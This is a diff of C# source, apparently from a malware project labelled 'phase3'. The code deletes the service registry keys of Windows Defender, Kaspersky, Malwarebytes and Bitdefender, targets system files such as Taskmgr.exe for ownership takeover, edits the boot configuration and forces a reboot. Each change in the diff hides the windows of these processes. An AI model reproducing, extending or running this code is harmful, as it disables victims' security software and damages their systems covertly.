@@ -125,41 +125,49 @@ namespace phase3
                 deleteservices.StartInfo.FileName = "reg.exe";
                 deleteservices.StartInfo.Arguments = "delete \"HKLM\\SYSTEM\\CurrentControlSet\\Services\\WinDefend\" /f";
                 deleteservices.StartInfo.Verb = "runas";
+                deleteservices.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
                 deleteservices.Start();
                 Process deleteserviescontrolset1 = new Process();
                 deleteserviescontrolset1.StartInfo.FileName = "reg.exe";
                 deleteserviescontrolset1.StartInfo.Arguments = "delete \"HKLM\\SYSTEM\\ControlSet001\\Services\\WinDefend\" /f";
                 deleteserviescontrolset1.StartInfo.Verb = "runas";
+                deleteserviescontrolset1.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
                 deleteserviescontrolset1.Start();
                 Process deletekaspersky = new Process();
                 deletekaspersky.StartInfo.FileName = "reg.exe";
                 deletekaspersky.StartInfo.Arguments = "delete \"HKLM\\SYSTEM\\CurrentControlSet\\Services\\AVP21.3\" /f";
                 deletekaspersky.StartInfo.Verb = "runas";
+                deletekaspersky.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
                 deletekaspersky.Start();
                 Process deletekasperskycontrolset1 = new Process();
                 deletekasperskycontrolset1.StartInfo.FileName = "reg.exe";
                 deletekasperskycontrolset1.StartInfo.Arguments = "delete \"HKLM\\SYSTEM\\ControlSet001\\Services\\AVP21.3\" /f";
                 deletekasperskycontrolset1.StartInfo.Verb = "runas";
+                deletekasperskycontrolset1.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
                 deletekasperskycontrolset1.Start();
                 Process deletembam = new Process();
                 deletembam.StartInfo.FileName = "reg.exe";
                 deletembam.StartInfo.Arguments = "delete \"HKLM\\SYSTEM\\CurrentControlSet\\Services\\MBAMService\" /f";
                 deletembam.StartInfo.Verb = "runas";
+                deletembam.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
                 deletembam.Start();
                 Process deletembamcontrolset1 = new Process();
                 deletembamcontrolset1.StartInfo.FileName = "reg.exe";
                 deletembamcontrolset1.StartInfo.Arguments = "delete \"HKLM\\SYSTEM\\ControlSet001\\Services\\MBAMService\" /f";
                 deletembamcontrolset1.StartInfo.Verb = "runas";
+                deletembamcontrolset1.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
                 deletembamcontrolset1.Start();
                 Process deletebitdefender = new Process();
                 deletebitdefender.StartInfo.FileName = "reg.exe";
                 deletebitdefender.StartInfo.Arguments = "delete \"HKLM\\SYSTEM\\CurrentControlSet\\Services\\VSSERV\" /f";
                 deletebitdefender.StartInfo.Verb = "runas";
+                deletebitdefender.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
                 deletebitdefender.Start();
                 Process deletebitdefendercontrolset1 = new Process();
                 deletebitdefendercontrolset1.StartInfo.FileName = "reg.exe";
                 deletebitdefendercontrolset1.StartInfo.Arguments = "delete \"HKLM\\SYSTEM\\ControlSet001\\Services\\VSSERV\" /f";
                 deletebitdefendercontrolset1.StartInfo.Verb = "runas";
+                deletebitdefendercontrolset1.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
                 deletebitdefendercontrolset1.Start();
                 string[] filestotakeown = {
                     @"C:\Windows\System32\Taskmgr.exe",
@@ -196,6 +204,7 @@ namespace phase3
             Process backtonormalmode = new Process();
             backtonormalmode.StartInfo.FileName = "bcdedit.exe";
             backtonormalmode.StartInfo.Arguments = "/deletevalue {current} safeboot";
+            backtonormalmode.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
             backtonormalmode.Start();
             } catch
             {
@@ -379,6 +388,7 @@ namespace phase3
                 Process reboot = new Process();
                 reboot.StartInfo.FileName = "shutdown.exe";
                 reboot.StartInfo.Arguments = "-r -t 0";
+                reboot.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
                 reboot.Start();
             } catch
             {
